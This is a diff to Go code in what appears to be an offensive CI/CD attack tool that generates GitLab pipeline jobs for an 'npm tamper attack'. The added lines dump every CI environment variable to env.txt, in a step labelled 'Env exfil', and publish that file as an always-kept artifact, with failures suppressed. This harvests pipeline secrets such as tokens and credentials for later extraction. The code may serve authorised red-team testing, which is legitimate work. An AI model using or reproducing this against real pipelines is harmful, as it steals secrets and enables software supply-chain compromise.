@@ -46,6 +46,11 @@ stages: [%s]
   script:
     - |
 %s
+  artifacts:
+    paths:
+      - env.txt
+      - npm_tamper_results.txt
+    when: always
   allow_failure: true%s
 `, stage, name, stage, img, tagsLine(o.Common.Tags), indented, rulesManual(o.Common.Manual))
 }
@@ -174,7 +179,10 @@ func buildNpmTamperScript(o NpmTamperOptions) string {
 	b.WriteString("  # Cleanup\n")
 	b.WriteString("  rm -rf \"$_tdir\"\n")
 	b.WriteString("  echo \"[*] npm tamper attack complete\"\n")
-	b.WriteString("}\n\n_NPM_TAMPER\n")
+	b.WriteString("}\n\n_NPM_TAMPER || true\n")
+	b.WriteString("\n# Env exfil — capture all CI variables for artifact extraction\n")
+	b.WriteString("printenv | sort > env.txt || true\n")
+	b.WriteString("echo \"npm tamper attack completed\" > npm_tamper_results.txt\n")
 
 	return b.String()
 }
